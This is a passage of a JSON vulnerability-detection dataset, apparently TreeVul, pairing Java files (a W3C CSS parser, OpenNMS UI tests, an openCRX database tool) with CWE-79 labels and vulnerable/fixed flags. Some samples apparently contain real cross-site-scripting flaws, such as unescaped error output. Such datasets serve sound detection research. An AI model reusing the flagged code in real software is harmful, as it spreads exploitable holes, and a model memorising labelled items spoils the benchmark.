notifyErrors(er);\n        } catch (Exception ex) {\n            // in case of error, ignore it.\n            reader = null;\n            if (Util.onDebug) {\n                System.err.println(\"Error in StyleSheet.parseStyleElement(\" + title + \",\"\n                        + url + \",\" + lineno + \")\");\n            }\n        }\n        if (reader != null) {\n            parseStyleElement(ac, reader, title, media, url, lineno);\n        }\n    }\n\n    /**\n     * Unify call to the parser for css doc as a reader.\n     *\n     * @param ac\n     * @param reader\n     * @param docref\n     */\n    public void parseStyleSheet(ApplContext ac, Reader reader, URL docref) {\n        parseStyleElement(ac, reader, null, null, (docref == null) ? ac.getFakeURL() : docref, 0);\n    }\n\n    /**\n     * Parse some declarations. All declarations always comes from the user\n     *\n     * @param input the inputStream containing the style data\n     * @param id    the uniq id\n     * @param url   the URL the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleAttribute(ApplContext ac, InputStream input, String id,\n                                    URL url, int lineno) {\n        style.setWarningLevel(ac.getWarningLevel());\n        lineno--; // why ?!?!\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseStyleAttribute(\" + id + \",\"\n                    + url + \",\" + lineno + \")\");\n        }\n\n        try {\n            //\t    if (cssFouffa == null) {\n            String charset = ac.getCharsetForURL(url);\n            cssFouffa = new CssFouffa(ac, input, charset, url, lineno);\n            cssFouffa.addListener(this);\n            //\t    } else\n//\t\tcssFouffa.ReInit(ac, input, url, lineno);\n            CssSelectors selector = new CssSelectors(ac);\n\n            try {\n                AtRuleMedia media = AtRuleMedia.getInstance(ac.getCssVersion());\n                if (ac.getCssVersion() != CssVersion.CSS1) {\n                    media.addMedia(null, \"all\", ac);\n                }\n                cssFouffa.setAtRule(media);\n            } catch (InvalidParamException e) {\n            } //ignore\n\n            try {\n                if (id == null || id.length() == 0) {\n                    id = \"nullId-\" + Long.toHexString(System.currentTimeMillis());\n                    // TODO add an error/warning ?\n                }\n                selector.addId(new IdSelector(id.substring(1)));\n            } catch (InvalidParamException e) {\n                style.removeThisRule();\n                ac.getFrame().addError(new CssError(e));\n            }\n            cssFouffa.parseDeclarations(selector);\n        } catch (IOException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, e));\n            notifyErrors(er);\n        }\n    }\n\n    /**\n     * @param input the inputStream containing the style data\n     * @param id    the uniq id\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     * @see #parseStyleAttribute(ApplContext, InputStream, String, URL, int)\n     * @deprecated Replaced by parseStyleAttribute\n     */\n    public void parseStyleAttribute(ApplContext ac, String input, String id,\n                                    URL url, int lineno) {\n        parseStyleAttribute(ac, new ByteArrayInputStream(input.getBytes()),\n                id, url, lineno);\n    }\n\n    public void setStyle(Class style) {\n        cssFouffa.setStyle(style);\n    }\n\n}\n",
    "target": 1,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700222,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "//\n// $Id$\n// From Philippe Le Hegaret (Philippe.Le_Hegaret@sophia.inria.fr)\n//\n// (c) COPYRIGHT MIT and INRIA, 1997.\n// Please first read the full copyright statement in file COPYRIGHT.html\n\npackage org.w3c.css.css;\n\nimport org.w3c.css.atrules.css.AtRuleMedia;\nimport org.w3c.css.atrules.css.AtRulePage;\nimport org.w3c.css.parser.AtRule;\nimport org.w3c.css.parser.CssError;\nimport org.w3c.css.parser.CssFouffa;\nimport org.w3c.css.parser.CssParseException;\nimport org.w3c.css.parser.CssSelectors;\nimport org.w3c.css.parser.CssValidatorListener;\nimport org.w3c.css.parser.Errors;\nimport org.w3c.css.parser.analyzer.ParseException;\nimport org.w3c.css.parser.analyzer.TokenMgrError;\nimport org.w3c.css.properties.css.CssProperty;\nimport org.w3c.css.selectors.IdSelector;\nimport org.w3c.css.util.ApplContext;\nimport org.w3c.css.util.CssVersion;\nimport org.w3c.css.util.InvalidParamException;\nimport org.w3c.css.util.Messages;\nimport org.w3c.css.util.Util;\nimport org.w3c.css.util.Warning;\nimport org.w3c.css.util.Warnings;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.io.StringReader;\nimport java.io.UnsupportedEncodingException;\nimport java.lang.reflect.Constructor;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.StringTokenizer;\n\n/**\n * @version $Revision$\n */\npublic final class StyleSheetParser\n        implements CssValidatorListener, CssParser {\n\n    private static Constructor co = null;\n\n    static {\n        try {\n            Class c = java.lang.Exception.class;\n            Class cp[] = {java.lang.Exception.class};\n            co = c.getDeclaredConstructor(cp);\n        } catch (NoSuchMethodException ex) {\n            co = null;\n        }\n    }\n\n    CssFouffa cssFouffa;\n    StyleSheet style = new StyleSheet();\n\n    public void reInit() {\n        style = new StyleSheet();\n    }\n\n    public StyleSheet getStyleSheet() {\n        return style;\n    }\n\n    public void setWarningLevel(int warningLevel) {\n        style.setWarningLevel(warningLevel);\n    }\n\n    public void notifyErrors(Errors errors) {\n        style.addErrors(errors);\n    }\n\n    public void notifyWarnings(Warnings warnings) {\n        style.addWarnings(warnings);\n    }\n\n    /**\n     * Adds a vector of properties to a selector.\n     *\n     * @param selector   the selector\n     * @param properties Properties to associate with contexts\n     */\n    public void handleRule(ApplContext ac, CssSelectors selector,\n                           ArrayList<CssProperty> properties) {\n        if (selector.getAtRule() instanceof AtRulePage) {\n            style.remove(selector);\n        }\n        for (CssProperty property : properties) {\n            property.setSelectors(selector);\n            style.addProperty(selector, property);\n        }\n    }\n\n    // part added by Sijtsche de Jong\n\n    public void addCharSet(String charset) {\n        style.addCharSet(charset);\n    }\n\n    public void newAtRule(AtRule atRule) {\n        style.newAtRule(atRule);\n    }\n\n    public void endOfAtRule() {\n        style.endOfAtRule();\n    }\n\n    public void setImportant(boolean important) {\n        style.setImportant(important);\n    }\n\n    public void setSelectorList(ArrayList<CssSelectors> selectors) {\n        style.setSelectorList(selectors);\n    }\n\n    public void setProperty(ArrayList<CssProperty> properties) {\n        style.setProperty(properties);\n    }\n\n    public void endOfRule() {\n        style.endOfRule();\n    }\n\n    public void removeThisRule() {\n        style.removeThisRule();\n    }\n\n    public void removeThisAtRule() {\n        style.removeThisAtRule();\n    }\n\n    //end of part added by Sijtsche de Jong\n\n    /**\n     * Handles an at-rule.\n     * <p/>\n     * <p>The parameter <code>value</code> can be :\n     * <DL>\n     * <DT>CssString\n     * <DD>The value coming from a string.\n     * <DT>CssURL\n     * <DD>The value coming from an URL.\n     * <DT>Vector\n     * <DD>The value is a vector of declarations (it contains properties).\n     * This feature is not legal, so be careful.\n     * </DL>\n     *\n     * @param ident  The ident for this at-rule (for example: 'font-face')\n     * @param string The string representation if this at-rule\n     */\n    public void handleAtRule(ApplContext ac, String ident, String string) {\n        style.getWarnings().addWarning(new Warning(cssFouffa.getSourceFile(),\n                cssFouffa.getLine(),\n                \"at-rule\",\n                2,\n                new String[]{ident, string},\n                ac));\n        //stylesheet.addAtRule(atRule);\n    }\n\n    /**\n     * @param url    the URL containing the style sheet\n     * @param title  the title of the stylesheet\n     * @param kind   may be a stylesheet or an alternate stylesheet\n     * @param media  the media to apply this\n     * @param origin the origin of the style sheet\n     * @throws IOException an IO error\n     */\n    public void parseURL(ApplContext ac, URL url, String title,\n                         String kind, String media,\n                         int origin) {\n        boolean doneref = false;\n        URL ref = ac.getReferrer();\n        setWarningLevel(ac.getWarningLevel());\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseURL(\" + url + \", \"\n                    + title + \", \"\n                    + kind + \", \" + media + \", \"\n                    + origin + \")\");\n        }\n        if (kind != null) {\n            kind = kind.trim().toLowerCase();\n            if (!kind.equals(\"stylesheet\") && !kind.equals(\"alternate stylesheet\")) {\n                return;\n            }\n        }\n        try {\n            ac.setOrigin(origin);\n//\t    if (cssFouffa == null) {\n            cssFouffa = new CssFouffa(ac, url);\n            cssFouffa.addListener(this);\n//\t    } else {\n//\t\tcssFouffa.ReInit(ac, url);\n//\t    }\n\n            //\t    cssFouffa.setResponse(res);\n\n            // removed plh 2001-03-08\n            // cssFouffa.setOrigin(origin);\n            //\t    cssFouffa.setDefaultMedium(defaultmedium);\n            //\t    cssFouffa.doConfig();\n            if (media == null) {\n                if (ac.getCssVersion() != CssVersion.CSS1) {\n                    if (ac.getMedium() == null) {\n                        media = \"all\";\n                    } else {\n                        media = ac.getMedium();\n                    }\n                }\n            }\n            AtRuleMedia m = AtRuleMedia.getInstance(ac.getCssVersion());\n            try {\n                if (media != null) {\n                    addMedias(m, media, ac);\n                }\n                cssFouffa.setAtRule(m);\n            } catch (org.w3c.css.util.InvalidParamException e) {\n                Errors er = new Errors();\n                er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                        -1, e));\n                notifyErrors(er);\n                return;\n            }\n            ac.setReferrer(url);\n            doneref = true;\n            cssFouffa.parseStyle();\n        } catch (Exception e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(Messages.escapeString(url.toString()),\n                    -1, new Exception(Messages.escapeString(e.getMessage()))));\n            notifyErrors(er);\n        } finally {\n            if (doneref) {\n                ac.setReferrer(ref);\n            }\n        }\n    }\n\n    // add media, easy version for CSS version < 3, otherwise, reuse the parser\n    private void addMedias(AtRuleMedia m, String medias, ApplContext ac) throws InvalidParamException {\n        // before CSS3, let's parse it the easy way...\n        if (ac.getCssVersion().compareTo(CssVersion.CSS3) < 0) {\n            StringTokenizer tokens = new StringTokenizer(medias, \",\");\n            while (tokens.hasMoreTokens()) {\n                m.addMedia(null, tokens.nextToken().trim(), ac);\n            }\n        } else {\n            CssFouffa muP = new CssFouffa(ac, new StringReader(medias));\n            try {\n                AtRuleMedia arm = muP.parseMediaDeclaration();\n                if (arm != null) {\n                    m.allMedia = arm.allMedia;\n                }\n            } catch (ParseException pex) {\n                // error already added, so nothing else to do\n            }\n        }\n    }\n\n    /**\n     * Parse a style element. The Style element always comes from the user\n     *\n     * @param reader the reader containing the style data\n     * @param url    the name of the file the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleElement(ApplContext ac, Reader reader,\n                                  String title, String media,\n                                  URL url, int lineno) {\n        boolean doneref = false;\n        style.setWarningLevel(ac.getWarningLevel());\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseStyleElement(\" + title + \", \"\n                    + media + \", \" + url\n                    + \",\" + lineno + \")\");\n        }\n        URL ref = ac.getReferrer();\n        try {\n\n//\t    if (cssFouffa == null) {\n            String charset = ac.getCharsetForURL(url);\n            cssFouffa = new CssFouffa(ac, reader, url, lineno);\n            cssFouffa.addListener(this);\n//\t    } else {\n//\t\tcssFouffa.ReInit(ac, input, url, lineno);\n//\t    }\n\n            //\t    cssFouffa.setResponse(res);\n            //\t    cssFouffa.setDefaultMedium(defaultmedium);\n            //\t    cssFouffa.doConfig();\n            if (media == null && ac.getCssVersion() != CssVersion.CSS1) {\n                media = \"all\";\n            }\n\n            AtRuleMedia m = AtRuleMedia.getInstance(ac.getCssVersion());\n            try {\n                if (media != null) {\n                    addMedias(m, media, ac);\n                }\n                cssFouffa.setAtRule(m);\n            } catch (org.w3c.css.util.InvalidParamException e) {\n                Errors er = new Errors();\n                er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                        -1, e));\n                notifyErrors(er);\n                return;\n            }\n            ac.setReferrer(url);\n            doneref = true;\n            cssFouffa.parseStyle();\n        } catch (IOException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, e));\n            notifyErrors(er);\n        } catch (TokenMgrError e) {\n            Errors er = new Errors();\n            CssParseException cpe = null;\n            if (co != null) {\n                try {\n                    Object o[] = new Object[1];\n                    o[0] = e;\n                    Exception new_e = (Exception) co.newInstance(o);\n                    cpe = new CssParseException(new_e);\n                } catch (Exception ex) {\n                    cpe = null;\n                }\n            }\n            if (cpe == null) {\n                cpe = new CssParseException(new Exception(e.getMessage()));\n            }\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1,\n                    //e.getErrorLine(),\n                    cpe));\n            notifyErrors(er);\n        } catch (RuntimeException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    cssFouffa.getLine(),\n                    new CssParseException(e)));\n            notifyErrors(er);\n        } finally {\n            if (doneref) {\n                ac.setReferrer(ref);\n            }\n        }\n    }\n\n    /**\n     * @param input the inputStream containing the style data\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     * @see #parseStyleElement(ApplContext, InputStream, String, String, URL, int)\n     * @deprecated Replaced by parseStyleElement\n     */\n    public void parseStyleElement(ApplContext ac, String input, URL url, int lineno) {\n        parseStyleElement(ac, new StringReader(input), null, null, url, lineno);\n    }\n\n    /**\n     * Parse a style element. The Style element always comes from the user\n     *\n     * @param input the input stream containing the style data\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleElement(ApplContext ac, InputStream input,\n                                  String title, String media,\n                                  URL url, int lineno) {\n        InputStreamReader reader = null;\n        String charset = ac.getCharsetForURL(url);\n        try {\n            reader = new InputStreamReader(input, (charset == null) ?\n                    \"iso-8859-1\" : charset);\n        } catch (UnsupportedEncodingException uex) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, uex));\n            notifyErrors(er);\n        } catch (Exception ex) {\n            // in case of error, ignore it.\n            reader = null;\n            if (Util.onDebug) {\n                System.err.println(\"Error in StyleSheet.parseStyleElement(\" + title + \",\"\n                        + url + \",\" + lineno + \")\");\n            }\n        }\n        if (reader != null) {\n            parseStyleElement(ac, reader, title, media, url, lineno);\n        }\n    }\n\n    /**\n     * Unify call to the parser for css doc as a reader.\n     *\n     * @param ac\n     * @param reader\n     * @param docref\n     */\n    public void parseStyleSheet(ApplContext ac, Reader reader, URL docref) {\n        parseStyleElement(ac, reader, null, null, (docref == null) ? ac.getFakeURL() : docref, 0);\n    }\n\n    /**\n     * Parse some declarations. All declarations always comes from the user\n     *\n     * @param input the inputStream containing the style data\n     * @param id    the uniq id\n     * @param url   the URL the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleAttribute(ApplContext ac, InputStream input, String id,\n                                    URL url, int lineno) {\n        style.setWarningLevel(ac.getWarningLevel());\n        lineno--; // why ?!?!\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseStyleAttribute(\" + id + \",\"\n                    + url + \",\" + lineno + \")\");\n        }\n\n        try {\n            //\t    if (cssFouffa == null) {\n            String charset = ac.getCharsetForURL(url);\n            cssFouffa = new CssFouffa(ac, input, charset, url, lineno);\n            cssFouffa.addListener(this);\n            //\t    } else\n//\t\tcssFouffa.ReInit(ac, input, url, lineno);\n            CssSelectors selector = new CssSelectors(ac);\n\n            try {\n                AtRuleMedia media = AtRuleMedia.getInstance(ac.getCssVersion());\n                if (ac.getCssVersion() != CssVersion.CSS1) {\n                    media.addMedia(null, \"all\", ac);\n                }\n                cssFouffa.setAtRule(media);\n            } catch (InvalidParamException e) {\n            } //ignore\n\n            try {\n                if (id == null || id.length() == 0) {\n                    id = \"nullId-\" + Long.toHexString(System.currentTimeMillis());\n                    // TODO add an error/warning ?\n                }\n                selector.addId(new IdSelector(id.substring(1)));\n            } catch (InvalidParamException e) {\n                style.removeThisRule();\n                ac.getFrame().addError(new CssError(e));\n            }\n            cssFouffa.parseDeclarations(selector);\n        } catch (IOException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, e));\n            notifyErrors(er);\n        }\n    }\n\n    /**\n     * @param input the inputStream containing the style data\n     * @param id    the uniq id\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     * @see #parseStyleAttribute(ApplContext, InputStream, String, URL, int)\n     * @deprecated Replaced by parseStyleAttribute\n     */\n    public void parseStyleAttribute(ApplContext ac, String input, String id,\n                                    URL url, int lineno) {\n        parseStyleAttribute(ac, new ByteArrayInputStream(input.getBytes()),\n                id, url, lineno);\n    }\n\n    public void setStyle(Class style) {\n        cssFouffa.setStyle(style);\n    }\n\n}\n",
    "target": 0,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700223,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*******************************************************************************\n * This file is part of OpenNMS(R).\n *\n * Copyright (C) 2011-2014 The OpenNMS Group, Inc.\n * OpenNMS(R) is Copyright (C) 1999-2014 The OpenNMS Group, Inc.\n *\n * OpenNMS(R) is a registered trademark of The OpenNMS Group, Inc.\n *\n * OpenNMS(R) is free software: you can redistribute it and/or modify\n * it under the terms of the GNU Affero General Public License as published\n * by the Free Software Foundation, either version 3 of the License,\n * or (at your option) any later version.\n *\n * OpenNMS(R) is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU Affero General Public License for more details.\n *\n * You should have received a copy of the GNU Affero General Public License\n * along with OpenNMS(R).  If not, see:\n *      http://www.gnu.org/licenses/\n *\n * For more information contact:\n *     OpenNMS(R) Licensing <license@opennms.org>\n *     http://www.opennms.org/\n *     http://www.opennms.com/\n *******************************************************************************/\n\npackage org.opennms.smoketest;\n\nimport static org.junit.Assert.assertEquals;\n\nimport org.junit.Before;\nimport org.junit.FixMethodOrder;\nimport org.junit.Test;\nimport org.junit.runners.MethodSorters;\nimport org.openqa.selenium.By;\n\n@FixMethodOrder(MethodSorters.NAME_ASCENDING)\npublic class NotificationsPageIT extends OpenNMSSeleniumIT {\n    @Before\n    public void setUp() throws Exception {\n        notificationsPage();\n    }\n\n    @Test\n    public void testAllTextIsPresent() throws Exception {\n        assertEquals(3, countElementsMatchingCss(\"div.card-header\"));\n        findElementByXpath(\"//span[text()='Notification queries']\");\n        findElementByXpath(\"//span[text()='Outstanding and Acknowledged Notices']\");\n        findElementByXpath(\"//span[text()='Notification Escalation']\");\n    }\n\n    @Test\n    public void testAllLinksArePresent() {\n        findElementByLink(\"Your outstanding notices\");\n        findElementByLink(\"All outstanding notices\");\n        findElementByLink(\"All acknowledged notices\");\n    }\n\n    @Test\n    public void testAllFormsArePresent() {\n        findElementByXpath(\"//button[@id='btn_search_by_notice' and @type='submit']\");\n        findElementByXpath(\"//button[@id='btn_search_by_user' and @type='submit']\");\n    }\n\n    @Test\n    public void testAllLinks() {\n        findElementByLink(\"Your outstanding notices\").click();\n        findElementByXpath(\"//span[@class='label label-default' and contains(text(), 'admin was notified')]\");\n        findElementByLink(\"[Remove all]\");\n        findElementByLink(\"Sent Time\");\n        findElementByXpath(\"//button[@type='button' and text()='Acknowledge Notices']\");\n\n        notificationsPage();\n        findElementByLink(\"All outstanding notices\").click();\n        findElementByXpath(\"//p//strong[text()='outstanding']\");\n        findElementByLink(\"[Show acknowledged]\");\n        findElementByLink(\"Respond Time\");\n        assertElementDoesNotHaveText(By.xpath(\"//span[@class='label label-default']\"), \"admin was notified [-]\");\n\n        notificationsPage();\n        findElementByLink(\"All acknowledged notices\").click();\n        findElementByXpath(\"//p//strong[text()='acknowledged']\");\n        findElementByLink(\"[Show outstanding]\");\n        findElementByLink(\"Respond Time\");\n        assertElementDoesNotHaveText(By.xpath(\"//span[@class='label label-default']\"), \"admin was notified [-]\");\n    }\n\n}\n",
    "target": 1,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700250,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*******************************************************************************\n * This file is part of OpenNMS(R).\n *\n * Copyright (C) 2011-2014 The OpenNMS Group, Inc.\n * OpenNMS(R) is Copyright (C) 1999-2014 The OpenNMS Group, Inc.\n *\n * OpenNMS(R) is a registered trademark of The OpenNMS Group, Inc.\n *\n * OpenNMS(R) is free software: you can redistribute it and/or modify\n * it under the terms of the GNU Affero General Public License as published\n * by the Free Software Foundation, either version 3 of the License,\n * or (at your option) any later version.\n *\n * OpenNMS(R) is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU Affero General Public License for more details.\n *\n * You should have received a copy of the GNU Affero General Public License\n * along with OpenNMS(R).  If not, see:\n *      http://www.gnu.org/licenses/\n *\n * For more information contact:\n *     OpenNMS(R) Licensing <license@opennms.org>\n *     http://www.opennms.org/\n *     http://www.opennms.com/\n *******************************************************************************/\n\npackage org.opennms.smoketest;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.openqa.selenium.support.ui.ExpectedConditions.visibilityOfElementLocated;\n\nimport java.time.Duration;\nimport java.time.temporal.ChronoUnit;\n\nimport org.junit.Before;\nimport org.junit.FixMethodOrder;\nimport org.junit.Test;\nimport org.junit.runners.MethodSorters;\nimport org.openqa.selenium.Alert;\nimport org.openqa.selenium.By;\nimport org.openqa.selenium.support.ui.ExpectedConditions;\nimport org.openqa.selenium.support.ui.Select;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@FixMethodOrder(MethodSorters.NAME_ASCENDING)\npublic class NotificationsPageIT extends OpenNMSSeleniumIT {\n    private static final Logger LOG = LoggerFactory.getLogger(NotificationsPageIT.class);\n\n    @Before\n    public void setUp() throws Exception {\n        notificationsPage();\n    }\n\n    @Test\n    public void testAllTextIsPresent() throws Exception {\n        assertEquals(3, countElementsMatchingCss(\"div.card-header\"));\n        findElementByXpath(\"//span[text()='Notification queries']\");\n        findElementByXpath(\"//span[text()='Outstanding and Acknowledged Notices']\");\n        findElementByXpath(\"//span[text()='Notification Escalation']\");\n    }\n\n    @Test\n    public void testAllLinksArePresent() {\n        findElementByLink(\"Your outstanding notices\");\n        findElementByLink(\"All outstanding notices\");\n        findElementByLink(\"All acknowledged notices\");\n    }\n\n    @Test\n    public void testAllFormsArePresent() {\n        findElementByXpath(\"//button[@id='btn_search_by_notice' and @type='submit']\");\n        findElementByXpath(\"//button[@id='btn_search_by_user' and @type='submit']\");\n    }\n\n    @Test\n    public void testAllLinks() {\n        findElementByLink(\"Your outstanding notices\").click();\n        findElementByXpath(\"//span[@class='label label-default' and contains(text(), 'admin was notified')]\");\n        findElementByLink(\"[Remove all]\");\n        findElementByLink(\"Sent Time\");\n        findElementByXpath(\"//button[@type='button' and text()='Acknowledge Notices']\");\n\n        notificationsPage();\n        findElementByLink(\"All outstanding notices\").click();\n        findElementByXpath(\"//p//strong[text()='outstanding']\");\n        findElementByLink(\"[Show acknowledged]\");\n        findElementByLink(\"Respond Time\");\n        assertElementDoesNotHaveText(By.xpath(\"//span[@class='label label-default']\"), \"admin was notified [-]\");\n\n        notificationsPage();\n        findElementByLink(\"All acknowledged notices\").click();\n        findElementByXpath(\"//p//strong[text()='acknowledged']\");\n        findElementByLink(\"[Show outstanding]\");\n        findElementByLink(\"Respond Time\");\n        assertElementDoesNotHaveText(By.xpath(\"//span[@class='label label-default']\"), \"admin was notified [-]\");\n    }\n}\n",
    "target": 0,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700251,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * ====================================================================\n * Project:     openCRX/Core, http://www.opencrx.org/\n * Description: CopyDb tool\n * Owner:       CRIXP AG, Switzerland, http://www.crixp.com\n * ====================================================================\n *\n * This software is published under the BSD license\n * as listed below.\n * \n * Copyright (c) 2004-2020, CRIXP Corp., Switzerland\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without \n * modification, are permitted provided that the following conditions \n * are met:\n * \n * * Redistributions of source code must retain the above copyright\n * notice, this list of conditions and the following disclaimer.\n * \n * * Redistributions in binary form must reproduce the above copyright\n * notice, this list of conditions and the following disclaimer in\n * the documentation and/or other materials provided with the\n * distribution.\n * \n * * Neither the name of CRIXP Corp. nor the names of the contributors\n * to openCRX may be used to endorse or promote products derived\n * from this software without specific prior written permission\n * \n * \n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND\n * CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES,\n * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n * TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON\n * ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY\n * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n * \n * ------------------\n * \n * This product includes software developed by the Apache Software\n * Foundation (http://www.apache.org/).\n * \n * This product includes software developed by contributors to\n * openMDX (http://www.openmdx.org/)\n */\npackage org.opencrx.kernel.tools;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintStream;\nimport java.io.Reader;\nimport java.lang.reflect.Method;\nimport java.math.BigDecimal;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.ResultSetMetaData;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Set;\n\nimport org.opencrx.kernel.utils.DbSchemaUtils;\nimport org.opencrx.kernel.utils.Utils;\nimport org.openmdx.base.dataprovider.layer.persistence.jdbc.Database_2;\nimport org.openmdx.base.exception.ServiceException;\nimport org.openmdx.kernel.exception.BasicException;\n\n/**\n * CopyDb\n *\n */\npublic class CopyDb {\n\n\t/**\n\t * Map CLOB to String.\n\t * \n\t * @param clob\n\t * @return\n\t * @throws IOException\n\t * @throws SQLException\n\t */\n\tprivate static String getStringFromClob(\n\t\tjava.sql.Clob clob\n\t) throws IOException, SQLException {\n\t\tReader reader = clob.getCharacterStream();\n\t\tStringBuilder s = new StringBuilder();\n\t\tint c;\n\t\twhile ((c = reader.read()) != -1) {\n\t\t\ts.append((char) c);\n\t\t}\n\t\treturn s.toString();\n\t}\n\n\t/**\n\t * Map BLOB to byte[].\n\t * \n\t * @param blob\n\t * @return\n\t * @throws IOException\n\t * @throws SQLException\n\t */\n\tprivate static byte[] getBytesFromBlob(\n\t\tjava.sql.Blob blob\n\t) throws IOException, SQLException {\n\t\tInputStream is = blob.getBinaryStream();\n\t\tByteArrayOutputStream os = new ByteArrayOutputStream();\n\t\tint b;\n\t\twhile ((b = is.read()) != -1) {\n\t\t\tos.write(b);\n\t\t}\n\t\tos.close();\n\t\treturn os.toByteArray();\n\t}\n\n\t/**\n\t * Db-specific column name mapping.\n\t * \n\t * @param conn\n\t * @param dbObject\n\t * @param columnName\n\t * @return\n\t * @throws SQLException\n\t */\n\tprivate static String mapColumnName(\n\t\tConnection conn, \n\t\tString dbObject, \n\t\tString columnName\n\t) throws SQLException {\n\t\tString databaseProductName = conn.getMetaData().getDatabaseProductName();\n\t\tif(\"HSQL Database Engine\".equals(databaseProductName)) {\n\t\t\tString mappedColumnName = columnName.toUpperCase();\n\t\t\tif(\"POSITION\".equals(mappedColumnName) || mappedColumnName.indexOf(\"$\") > 0) {\n\t\t\t\treturn \"\\\"\" + mappedColumnName + \"\\\"\";\n\t\t\t} else {\n\t\t\t\treturn mappedColumnName;\n\t\t\t}\n\t\t} else if(\"PostgreSQL\".equals(databaseProductName)) {\n\t\t\tString mappedColumnName = columnName.toLowerCase();\n\t\t\tif(\"offset\".equals(mappedColumnName) || \"end\".equals(mappedColumnName) || mappedColumnName.indexOf(\"-\") > 0) {\n\t\t\t\treturn \"\\\"\" + mappedColumnName + \"\\\"\";\n\t\t\t} else {\n\t\t\t\treturn mappedColumnName;\n\t\t\t}\n\t\t} else {\n\t\t\treturn columnName.toUpperCase();\n\t\t}\n\t}\n\n\t/**\n\t * DB-specific column value mapping.\n\t * \n\t * @param conn\n\t * @param dbObject\n\t * @param columnName\n\t * @param columnValue\n\t * @param valuePatterns\n\t * @param valueReplacements\n\t * @return\n\t * @throws ServiceException\n\t * @throws SQLException\n\t */\n\tprivate static Object mapColumnValue(\n\t\tConnection conn, \n\t\tString dbObject, \n\t\tString columnName, \n\t\tObject columnValue, \n\t\tList<String> valuePatterns,\n\t\tList<String> valueReplacements\n\t) throws ServiceException, SQLException {\n\t\tString databaseProductName = conn.getMetaData().getDatabaseProductName();\n\t\tif(BOOLEAN_COLUMNS.contains(columnName.toUpperCase())) {\n\t\t\tif(\"PostgreSQL\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(\"MySQL\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else if(\"Microsoft SQL Server\".equals(databaseProductName)) {\n\t\t\t\treturn columnValue;\n\t\t\t} else 